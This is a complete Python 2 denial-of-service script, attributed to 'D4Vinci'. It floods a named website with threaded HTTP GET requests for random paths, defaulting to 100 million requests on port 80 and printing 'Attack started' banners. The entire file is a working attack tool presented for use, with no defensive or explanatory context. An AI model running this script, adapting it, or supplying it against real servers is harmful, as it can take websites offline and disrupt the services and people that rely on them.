# -*- coding: utf-8 -*-
# Author : D4Vinci
# All copyrights to Squnity team

import random
import socket
import string
import sys
import threading
import time

# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
    sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print " ERROR\n Make sure you entered a correct website"
    sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#"

    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
    except socket.error, e:
        print "\n [ No connection, server may be down ]: " + str(e)
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)

# Spawn a thread per request
all_threads = []
for i in xrange(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
